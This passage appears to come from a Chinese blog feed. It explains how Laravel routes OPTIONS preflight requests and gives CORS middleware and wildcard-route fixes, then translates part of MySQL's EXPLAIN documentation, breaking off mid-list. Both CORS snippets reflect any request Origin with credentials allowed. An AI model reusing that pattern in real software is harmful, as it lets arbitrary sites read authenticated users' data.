<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="comment"># vendor/laravel/framework/src/Illuminate/Routing/RouteCollection.php</span></span><br><span class="line">    <span class="variable">$routes</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$request</span>-&gt;<span class="title function_ invoke__">getMethod</span>());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// First, we will see if we can find a matching route for this current request</span></span><br><span class="line">    <span class="comment">// method. If we can, great, we can just return it so that it can be called</span></span><br><span class="line">    <span class="comment">// by the consumer. Otherwise we will check for routes with another verb.</span></span><br><span class="line">    <span class="variable">$route</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">matchAgainstRoutes</span>(<span class="variable">$routes</span>, <span class="variable">$request</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="title function_ invoke__">is_null</span>(<span class="variable">$route</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$route</span>-&gt;<span class="title function_ invoke__">bind</span>(<span class="variable">$request</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// If no route was found we will now check if a matching route is specified by</span></span><br><span class="line">    <span class="comment">// another HTTP verb. If it is we will need to throw a MethodNotAllowed and</span></span><br><span class="line">    <span class="comment">// inform the user agent of which HTTP verb it should use for this route.</span></span><br><span class="line">    <span class="variable">$others</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkForAlternateVerbs</span>(<span class="variable">$request</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$others</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRouteForMethods</span>(<span class="variable">$request</span>, <span class="variable">$others</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NotFoundHttpException</span>;</span><br></pre></td></tr></table></figure>

<p>定位到Laravel路由的逻辑后知道了其中的端倪：</p>
<ol>
<li><p>首先根据当前HTTP方法（GET/POST/PUT/…）查找是否有匹配的路由，如果有<code>（if(! is_null($route))</code>条件成立)，非常好，绑定后直接返回，继续此后的调用流程即可；</p>
</li>
<li><p>否则，根据$request的路由找到可能匹配的HTTP方法（即URL匹配，但是HTTP请求方式为其它品种的），如果<code>count($others) &gt; 0)</code>条件成立，则继续进入<code>$this-&gt;getRouteForMethods($request, $others)</code>方法；</p>
</li>
<li><p>否则抛出NotFoundHttpException，即上述说到的<code>404 NOT FOUND</code>错误。</p>
</li>
</ol>
<p>倘若走的是第2步，可看到函数逻辑为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="comment"># vendor/laravel/framework/src/Illuminate/Routing/RouteCollection.php</span></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get a route (if necessary) that responds when other available methods are present.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  \Illuminate\Http\Request  $request</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  array  $methods</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> \Illuminate\Routing\Route</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> \Symfony\Component\HttpKernel\Exception\MethodNotAllowedHttpException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getRouteForMethods</span>(<span class="params"><span class="variable">$request</span>, <span class="keyword">array</span> <span class="variable">$methods</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$request</span>-&gt;<span class="title function_ invoke__">method</span>() == <span class="string">&#x27;OPTIONS&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">new</span> <span class="title class_">Route</span>(<span class="string">&#x27;OPTIONS&#x27;</span>, <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">path</span>(), <span class="function"><span class="keyword">function</span> (<span class="params"></span>) <span class="keyword">use</span> (<span class="params"><span class="variable">$methods</span></span>) </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Response</span>(<span class="string">&#x27;&#x27;</span>, <span class="number">200</span>, [<span class="string">&#x27;Allow&#x27;</span> =&gt; <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$methods</span>)]);</span><br><span class="line">            &#125;))-&gt;<span class="title function_ invoke__">bind</span>(<span class="variable">$request</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">methodNotAllowed</span>(<span class="variable">$methods</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>判断如果请求方式是<code>OPTIONS</code>，则返回状态码为200的正确响应（但是没有添加任何header信息），否则返回一个<code>methodNotAllowed</code>状态码为405的错误（即请求方式不允许的情况）。</p>
<p>由此可见，Laravel针对<code>OPTIONS</code>方式的HTTP请求处理方式已经固定了，最笨的方法是对跨域请求的每一个GET或POST请求都撰写一个同名的<code>OPTIONS</code>类型的路由，添加允许跨域的header，也有其他方法进行处理。</p>
<h5 id="Laravel-options请求跨域处理"><a href="#Laravel-options请求跨域处理" class="headerlink" title="Laravel options请求跨域处理"></a>Laravel options请求跨域处理</h5><h6 id="中间件方案"><a href="#中间件方案" class="headerlink" title="中间件方案"></a>中间件方案</h6><p>在文件 <code>app/Http/Kernel.php</code>中，有两处可以定义中间件。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="comment"># app/Http/Kernel.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 总中间件</span></span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$middleware</span> = [</span><br><span class="line">        <span class="title class_">\Illuminate\Foundation\Http\Middleware\CheckForMaintenanceMode</span>::<span class="variable language_">class</span>,</span><br><span class="line">        <span class="title class_">\Illuminate\Foundation\Http\Middleware\ValidatePostSize</span>::<span class="variable language_">class</span>,</span><br><span class="line">        <span class="title class_">\App\Http\Middleware\TrimStrings</span>::<span class="variable language_">class</span>,</span><br><span class="line">        <span class="title class_">\Illuminate\Foundation\Http\Middleware\ConvertEmptyStringsToNull</span>::<span class="variable language_">class</span>,</span><br><span class="line">        <span class="title class_">\App\Http\Middleware\TrustProxies</span>::<span class="variable language_">class</span>,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 群组中间件</span></span><br><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * The application&#x27;s route middleware groups.</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@var</span> array</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$middlewareGroups</span> = [</span><br><span class="line">        <span class="string">&#x27;web&#x27;</span> =&gt; [</span><br><span class="line">            <span class="title class_">\App\Http\Middleware\EncryptCookies</span>::<span class="variable language_">class</span>,</span><br><span class="line">            <span class="title class_">\Illuminate\Cookie\Middleware\AddQueuedCookiesToResponse</span>::<span class="variable language_">class</span>,</span><br><span class="line">            <span class="title class_">\Illuminate\Session\Middleware\StartSession</span>::<span class="variable language_">class</span>,</span><br><span class="line">            <span class="comment">// \Illuminate\Session\Middleware\AuthenticateSession::class,</span></span><br><span class="line">            <span class="title class_">\Illuminate\View\Middleware\ShareErrorsFromSession</span>::<span class="variable language_">class</span>,</span><br><span class="line">            <span class="title class_">\App\Http\Middleware\VerifyCsrfToken</span>::<span class="variable language_">class</span>,</span><br><span class="line">            <span class="title class_">\Illuminate\Routing\Middleware\SubstituteBindings</span>::<span class="variable language_">class</span>,</span><br><span class="line">        ],</span><br><span class="line">        <span class="string">&#x27;api&#x27;</span> =&gt; [</span><br><span class="line">            <span class="string">&#x27;throttle:60,1&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;bindings&#x27;</span>,</span><br><span class="line">            <span class="title class_">\Illuminate\Session\Middleware\StartSession</span>::<span class="variable language_">class</span>,</span><br><span class="line">        ],</span><br><span class="line">    ];</span><br></pre></td></tr></table></figure>
<p>第一处是总中间件 <code>$middleware</code>，任何请求都会通过这里；</p>
<p>第二处是群组中间件 <code>middlewareGroups</code>，<strong>只有路由匹配上对应群组模式的才会通过这部分</strong>，之前的OPTIONS请求尚未通过此处中间件的handle函数，就会返回。</p>
<p>因此我们添加的中间件，需要添加到$middleware数组中，不能添加到api群组路由中间件中。</p>
<p>在<code>app/Http/Middleware</code>文件夹下新建<code>PreflightResponse.php</code>文件：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="comment">#PreflightResponse.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">App</span>\<span class="title class_">Http</span>\<span class="title class_">Middleware</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Closure</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PreflightResponse</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * Handle an incoming request.</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span>  \Illuminate\Http\Request  $request</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span>  \Closure  $next</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span>  string|null  $guard</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span> mixed</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">handle</span>(<span class="params"><span class="variable">$request</span>, <span class="built_in">Closure</span> <span class="variable">$next</span>, <span class="variable">$guard</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$request</span>-&gt;<span class="title function_ invoke__">getMethod</span>() === <span class="string">&#x27;OPTIONS&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable">$origin</span> = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">header</span>(<span class="string">&#x27;ORIGIN&#x27;</span>, <span class="string">&#x27;*&#x27;</span>);</span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="string">&quot;Access-Control-Allow-Origin: <span class="subst">$origin</span>&quot;</span>);</span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="string">&quot;Access-Control-Allow-Credentials: true&quot;</span>);</span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Access-Control-Allow-Methods: POST, GET, OPTIONS, PUT, DELETE&#x27;</span>);</span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Access-Control-Allow-Headers: Origin, Access-Control-Request-Headers, SERVER_NAME, Access-Control-Allow-Headers, cache-control, token, X-Requested-With, Content-Type, Accept, Connection, User-Agent, Cookie, X-XSRF-TOKEN&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$next</span>(<span class="variable">$request</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中这里针对OPTIONS请求的处理内容是添加多个header内容，可根据实际需要修改相关处理逻辑。</p>
<h6 id="通配路由匹配方案"><a href="#通配路由匹配方案" class="headerlink" title="通配路由匹配方案"></a>通配路由匹配方案</h6><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">options</span>(<span class="string">&#x27;/&#123;all&#125;&#x27;</span>, function(Request <span class="variable">$request</span>) &#123;</span><br><span class="line">    <span class="variable">$origin</span> = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">header</span>(<span class="string">&#x27;ORIGIN&#x27;</span>, <span class="string">&#x27;*&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Access-Control-Allow-Origin: <span class="subst">$origin</span>&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Access-Control-Allow-Credentials: true&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Access-Control-Allow-Methods: POST, GET, OPTIONS, PUT, DELETE&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Access-Control-Allow-Headers: Origin, Access-Control-Request-Headers, SERVER_NAME, Access-Control-Allow-Headers, cache-control, token, X-Requested-With, Content-Type, Accept, Connection, User-Agent, Cookie&#x27;</span>);</span><br><span class="line">&#125;)-&gt;<span class="title function_ invoke__">where</span>([<span class="string">&#x27;all&#x27;</span> =&gt; <span class="string">&#x27;([a-zA-Z0-9-]|/)+&#x27;</span>]);</span><br></pre></td></tr></table></figure>
<p>这样所有的OPTIONS请求都能找到匹配的路由，在此处可统一处理所有OPTIONS请求，不需要额外进行处理。</p>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><blockquote>
<p><a href="https://www.cnblogs.com/virtual/p/3720750.html">https://www.cnblogs.com/virtual/p/3720750.html</a><br><a href="https://www.w3.org/Protocols/rfc2616/rfc2616-sec9.html">https://www.w3.org/Protocols/rfc2616/rfc2616-sec9.html</a><br><a href="https://zhuanlan.zhihu.com/p/33542992">https://zhuanlan.zhihu.com/p/33542992</a><br><a href="https://www.jianshu.com/p/552daaf2869c">https://www.jianshu.com/p/552daaf2869c</a></p>
</blockquote>
]]></content>
      <categories>
        <category>php</category>
        <category>laravel</category>
      </categories>
      <tags>
        <tag>跨域</tag>
        <tag>CORS</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL的explain文档</title>
    <url>/2017/08/04/mysql-explain/</url>
    <content><![CDATA[<p>文档原地址：<a href="https://dev.mysql.com/doc/refman/5.7/en/explain-output.html">EXPLAIN Output Format</a></p>
<blockquote>
<p>EXPLAIN提供一些MySQL执行SQL语句的信息，包括SELECT, DELETE, INSERT, REPLACE和UPDATE等语句。</p>
<p><strong>MySQL 5.6.3之前只支持SELECT</strong>。</p>
</blockquote>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>EXPLAIN作用于SELECT语句时会返回一列信息。SELECT语句会按照一定顺序输出表的内容。MySQL使用循环嵌套的方式处理所有的连表操作。这意味着MySQL会从第一张表中读取一行数据，然后在第二张表中读出相匹配的数据，然后第三张表等等。当所有的表都被执行到，MySQL会输出选中的列并且回溯表的数据直到找到匹配更多行的表。从找到的这个表里面读取下一行数据，然后下一个表。</p>
<p>EXPLAIN的输出包含不同的分割开来的数据。另外，对于SELECT语句，EXPLAIN还会生成一些额外的信息与<code>SHOW WARNING</code>的输出一起显示。</p>
<h2 id="输出内容"><a href="#输出内容" class="headerlink" title="输出内容"></a>输出内容</h2><p>下面介绍<code>EXPLAIN</code>命令的输出内容，稍后会补充<code>type</code>,<code>Extra</code>两个字段的信息。</p>
<p><code>EXPLAIN</code>输出的每行信息都对应于相应的一张表。每行输出的内容都总结在下文的表格中，表格最后一列是更加详细的说明。表格第一列是字段名，第二列是当加了<code>FORMAT=JSON</code>参数时跟第一列相同概念的字段名。</p>
<span id="more"></span>
<p><strong>Table 8.1 EXPLAIN Output Columns</strong></p>
<table>
<thead>
<tr>
<th>Column</th>
<th>JSON Name</th>
<th>Meaning</th>
</tr>
</thead>
<tbody><tr>
<td>id</td>
<td>select_id</td>
<td><code>SELECT</code>操作的唯一标识</td>
</tr>
<tr>
<td>select_type</td>
<td>None</td>
<td><code>SELECT</code>类型</td>
</tr>
<tr>
<td>table</td>
<td>table_name</td>
<td>操作的表名</td>
</tr>
<tr>
<td>partitions</td>
<td>partitions</td>
<td>匹配的分区</td>
</tr>
<tr>
<td>type</td>
<td>access_type</td>
<td>联表类型</td>
</tr>
<tr>
<td>possible_keys</td>
<td>possible_keys</td>
<td>可能用到的索引</td>
</tr>
<tr>
<td>key</td>
<td>key</td>
<td>用到的索引</td>
</tr>
<tr>
<td>key_len</td>
<td>key_length</td>
<td>用到的索引长度</td>
</tr>
<tr>
<td>ref</td>
<td>ref</td>
<td>与索引比较的值</td>
</tr>
<tr>
<td>rows</td>
<td>rows</td>
<td>预估查询的列数</td>
</tr>
<tr>
<td>filtered</td>
<td>filtered</td>
<td>被条件过滤掉的百分比</td>
</tr>
<tr>
<td>Extra</td>
<td>None</td>
<td>附加信息</td>
</tr>
</tbody></table>
<br/>
> **注意**
> 
> JSON格式的NULL值属性不会输出

<br/>

<ul>
<li><p>id (JSON Name: select_id)</p>
<p>  该<code>SELECT</code>语句的唯一标识。这个数字是有序产生的。如果数据是其他查询union而来的话这个值可以为null。在这种情况喜爱，<code>table</code>属性的值将会是<code>&lt;union M,N&gt;</code>格式，用来表明数据是由M和N查询组合而成。</p>
</li>
<li><p>select_type (JSON Name: None)</p>
<p>  <code>SELECT</code>操作的类型，可以是下表中的任意值。JSON格式的输出会将该字段值作为<code>query_block</code>输出，除非是<code>SIMPLE</code>或<code>PRIMARY</code>类型。JSON格式的名称同样在表中体现。</p>
<p>  <code>DEPENDENT</code>通常表示关联子查询的使用，查看文档 <a href="https://dev.mysql.com/doc/refman/5.7/en/correlated-subqueries.html">关联子查询</a></p>
<p>  <code>DEPENDENT SUBQUERY</code>同<code>UNCACHEABLE SUBQUERY</code>的评估是不同的。对于<code>DEPENDENT SUBQUERY</code>，对于每组从外部查询上下文中而来的变量的不同值，子查询仅重新评估一次。而<code>UNCACHEABLE SUBQUERY</code>对外部查询上下文的每一行都需要重新评估子查询。</p>
<p>  子查询的可缓存性与常说的sql查询缓存不一样(<a href="https://dev.mysql.com/doc/refman/5.7/en/query-cache-operation.html">查询缓存</a>)。子查询缓存发生在语句执行期间，而常说的查询缓存则是在语句执行完毕后存储结果。</p>
<p>  当使用JSON格式输出EXPLAIN结果时没有单独的<code>select_type</code>字段，而是输出另一个<code>query_block</code>字段。相当于大多数子查询的类型（一个示例 MATERIALIZED的materialized_from_subquery），并在适当时显示。SIMPLE和PRIMARY两种类型没有对应的JSON格式的值。</p>
<p>  在非SELECT语句中<code>select_type</code>的值展示的是语句类型。如<code>DELETE</code>语句的<code>select_type</code>的值是delete。</p>
</li>
</ul>
<table>
<thead>
<tr>
<th>select_type</th>
<th>JSON Name</th>
<th>Meaning</th>
</tr>
</thead>
<tbody><tr>
<td>SIMPLE</td>
<td>None</td>
<td>没有连表或自查询的简单查询</td>
</tr>
<tr>
<td>PRIMARY</td>
<td>None</td>
<td>最外层的查询</td>
</tr>
<tr>
<td>UNION</td>
<td>None</td>
<td>第二个或之后被union的查询</td>
</tr>
<tr>
<td>DEPENDENT UNION</td>
<td>dependent (true)</td>
<td>依赖于外部查询结果的第二个或之后被union的查询</td>
</tr>
<tr>
<td>UNION RESULT</td>
<td>union_result</td>
<td>union而来的查询结果</td>
</tr>
<tr>
<td>SUBQUERY</td>
<td>None</td>
<td>第一个子查询</td>
</tr>
<tr>
<td>DEPENDENT SUBQUERY</td>
<td>dependent (true)</td>
<td>依赖于外部查询结果的第一个个子查询</td>
</tr>
<tr>
<td>DERIVED</td>
<td>None</td>
<td><code>from</code>语句中的查询</td>
</tr>
<tr>
<td>MATERIALIZED</td>
<td>materialized_from_subquery</td>
<td>子查询</td>
</tr>
<tr>
<td>UNCACHEABLE SUBQUERY</td>
<td>cacheable (false)</td>
<td>不能缓存结果，并且必须对外部查询获取的每一行进行重新评估的子查询</td>
</tr>
<tr>
<td>UNCACHEABLE UNION</td>
<td>cacheable (false)</td>
<td>第二个或之后一个属于不可缓存结果子查询的UNION的查询 （见 UNCACHEABLE SUBQUERY）</td>
</tr>
</tbody></table>
<ul>
<li><p>table (JSON Name: table_name)</p>
<p>  操作到的表名，可以是以下的任何值</p>
<ul>
<li>&lt;unionM,N&gt;: 数据是由其他几个查询union而来, M和N为查询id</li>
<li>&lt;derivedN&gt;: id为N的查询中from子句是一个select语句，而当前查询的from子句是id为N的查询结果</li>
<li>&lt;subqueryN&gt;: The row refers to the result of a materialized subquery for the row with an id value of N. See Section 8.2.2.2, “Optimizing Subqueries with Materialization”.</li>
</ul>
</li>
<li><p>partitions (JSON Name: partitions)</p>
<p>  语句操作到的分区。无分区的表将会返回null。</p>
</li>
<li><p>type (JSON Name: access_type)</p>
<p>  联表类型，下文会有详细介绍。</p>
</li>
<li><p>possible_keys (JSON Name: possible_keys)</p>
<p>  possible_keys指出MySQL可以选择查询时用的所有索引。不过独立于实际输出的顺序。这意味着其中的索引并不一定会用到。</p>
<p>  如果此列是NULL（或未经JSON格式输出定义），则不存在相关索引。在这种情况下，您就可以通过检查WHERE子句来检查是否引用了适用于索引的某个或某些列通过建立索引来优化性能。</p>
<p>  要查看表的索引，请使用。 SHOW INDEX FROM tbl_name。</p>
</li>
<li><p>key (JSON Name: key)</p>
<p>  该列指出MySQL实际使用的索引。如果MySQL决定使用<code>possible_keys</code>中其中一个索引来查询数据，这个索引就会出现这一列。</p>
<p>  该列的值没有在<code>possible_keys</code>中是有可能的。这发生在<code>possible_keys</code>中所有的索引都不适合用来查表，但是选取的列又适用于其他的索引。也就是说，该索引作用于选中的列，虽然它并不用于确定要检索的行，但索引扫描效率要高于实际数据扫描。</p>
<p>  对于Innodb来说，一个辅助索引可能处理选中的列，即使MySQL也选择了主键，由于Innodb聚簇索引的特性，所有的辅助索引都依赖于主键。如果该列的值为null，是因为MySQL没有找到索引用来提高sql执行效率。</p>
<p>  让MySQL强制使用或不使用某个索引可以通过参数<code>FORCE INDEX</code>,<code> USE INDEX</code>或<code>IGNORE INDEX</code>实现。具体可查看<a href="https://dev.mysql.com/doc/refman/5.7/en/index-hints.html">文档</a>。</p>
<p>  对于MyISAM类型的表，可通过执行<code>ANALYZE TABLE</code>来帮助选择合适的索引用来提升性能，<code>myisamchk --analyze</code>也可以。</p>
</li>
<li><p>key_len (JSON Name: key_length)</p>
<p>  该字段标识MySQL决定使用该索引的长度, 可以帮助查明MySQL实际使用了一个多列索引的哪些部分。如果字段<code>key</code>的值为null，那么该字段的值也为null。</p>
<p>  由于索引的实际存储结构，可以为null的字段要比不可以为null字段索引长度长。</p>
</li>
<li><p>ref (JSON Name: ref)</p>
<p>  该字段展示的是哪一列或常量拿来与上面<code>key</code>字段中的索引做比较用于从表中取数据。</p>
<p>  如果值是<code>func</code>，说明该列使用的是某个函数的值。要查看是哪个函数，可以在<code>explain</code>命令后使用 <code>SHOW WARNING</code> 参数获取。这个函数很可能是算数运算符等运算。</p>
</li>
<li><p>rows (JSON Name:rows)</p>
<p>  该字段标识MySQL认为执行这条sql语句需要查询到的行数。</p>
<p>  对于<code>Innodb</code>引擎数据库的表，这个值只是一个估值，也很可能是不准确的。</p>
</li>
<li><p>filtered (JSON Name: filtered)</p>
<p>  该字段标识将由where语句过滤掉的行数占总行数的百分比估值。因此，<code>rows</code>字段展示查询到行数的估值而 <code>rows</code>*<code>filtered</code>/100 的值就是将被联接到前面表的行数。</p>
</li>
<li><p>Extra (JSON Name: none)</p>
<p>  该字段展示MySQL如果执行SQL语句的附加信息。下文会介绍不同值的含义。</p>
<p>  JSON格式的输出没有一个对应于该字段的字段。然而这些值可能会出现在另外一些JSON属性中或作为<code>message</code>属性的值输出。</p>
</li>
</ul>
<h3 id="type-联表-查询类型"><a href="#type-联表-查询类型" class="headerlink" title="type(联表/查询类型)"></a>type(联表/查询类型)</h3><p><code>type</code>字段展示不同表之间如何联接，对应于JSON格式中的<code>access_type</code>属性。下面列出不同的值类型，从优到劣的排序。</p>
<ul>
<li><p>system</p>
<p>  该表只有一行，是下面<code>const</code>类型的特殊情况。</p>
</li>
<li><p>const</p>
<p>  该表最多只匹配到一行，并且在查询的开始就命中。因为只有一行，所以该行的数据对于MySQL查询优化器可以看作是常量。<code>const</code>类型非常高效因为只读一次。</p>
<p>  该类型出现在使用一个常量与主键或唯一键比较时。下面的例子中，<code>tbl_name</code>表将作为<code>const</code>类型的表使用:</p>
  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> tbl_name <span class="keyword">WHERE</span> primary_key<span class="operator">=</span><span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> tbl_name</span><br><span class="line"><span class="keyword">WHERE</span> primary_key_part1<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> primary_key_part2<span class="operator">=</span><span class="number">2</span>;</span><br></pre></td></tr></table></figure></li>
<li><p>eq_ref</p>
<p>  数据是通过循环对比前面表中的值获取。除了<code>system</code>和<code>const</code>，这个是最高效的联表类型。该类型出现在联表使用的索引都是<code>主键</code>或<code>非NULL值唯一键</code>时。</p>
<p>  <code>eq_ref</code>用于索引列使用‘=’运算符的场景。比较的值可以是常量也可以是前面的表中读出的值。下面是示例:</p>
  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> ref_table, other_table</span><br><span class="line">    <span class="keyword">WHERE</span> ref_table.key_column<span class="operator">=</span>other_table.column;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> ref_table, other_table</span><br><span class="line">    <span class="keyword">WHERE</span> ref_table.key_column_part1<span class="operator">=</span>other_table.column</span><br><span class="line">    <span class="keyword">AND</span> ref_table.key_column_part2<span class="operator">=</span><span class="number">1</span>;</span><br></pre></td></tr></table></figure></li>
<li><p>ref</p>
<p>  当与前面表中取出的数据对比时都能命中索引。该类型出现在联表时使用了前缀索引或索引不是主键或唯一键(即不能跟根据索引命中唯一一行数据)。对于一个数据量不大的表来说，该类型效率也比较高。</p>
<p>  <code>ref</code>用于索引列使用‘=’、‘&lt;=’和‘&gt;=’运算符的场景。下面是示例:</p>
  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> ref_table <span class="keyword">WHERE</span> key_column<span class="operator">=</span>expr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> ref_table, other_table</span><br><span class="line">    <span class="keyword">WHERE</span> ref_table.key_column<span class="operator">=</span>other_table.column;</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> ref_table, other_table</span><br><span class="line">    <span class="keyword">WHERE</span> ref_table.key_column_part1<span class="operator">=</span>other_table.column</span><br><span class="line">    <span class="keyword">AND</span> ref_table.key_column_part2<span class="operator">=</span><span class="number">1</span>;</span><br></pre></td></tr></table></figure></li>
</ul>
<ul>
<li><p>fulltext</p>
<p>  使用全文索引时的联表类型。</p>
</li>
<li><p>ref_or_null</p>
<p>  类似于<code>ref</code>类型，但是多一个NULL值的判断。常用于多条件查询，示例如下:</p>
  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> ref_table</span><br><span class="line">    <span class="keyword">WHERE</span> key_column<span class="operator">=</span>expr <span class="keyword">OR</span> key_column <span class="keyword">IS</span> <span class="keyword">NULL</span>;</span><br></pre></td></tr></table></figure></li>
<li><p>index_merge</p>
<p>  该类型说明MySQL使用了<a href="https://dev.mysql.com/doc/refman/5.7/en/index-merge-optimization.html">索引合并优化</a>。这种情形下，<code>key</code>字段的值是使用的索引列表，<code>key_len</code>的值是所使用索引的最长关键部分的列表。</p>
</li>
<li><p>unique_subquery</p>
<p>  该类型是在含有某些类似下面示例中IN条件查询时对于<code>eq_ref</code>类型的补充:</p>
  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">value</span> <span class="keyword">IN</span> (<span class="keyword">SELECT</span> primary_key <span class="keyword">FROM</span> single_table <span class="keyword">WHERE</span> some_expr)</span><br></pre></td></tr></table></figure>

<p>  该类型只是一种索引查询功能，用于替换掉原有的子条件查询以获取更高的性能。</p>
</li>
<li><p>index_subquery</p>
<p>  该类型类似于<code>unique_subquery</code>，唯一不同的是IN子查询的索引不一定是NOT NULL。</p>
</li>
<li><p>range</p>
<p>  使用索引时仅在给定的范围查找。这种情况下，<code>key</code>字段的值展示使用的索引，<code>key_len</code>是实际使用到索引最长的关键部分的长度，<code>ref</code>字段是NULL。</p>
<p>  当索引列跟一个常量做 =, &lt;&gt;, &gt;, &gt;=, &lt;, &lt;=, IS NULL, &lt;=&gt;, BETWEEN, 或 IN() 其中任意运算时该类型将会被使用。示例如下:</p>
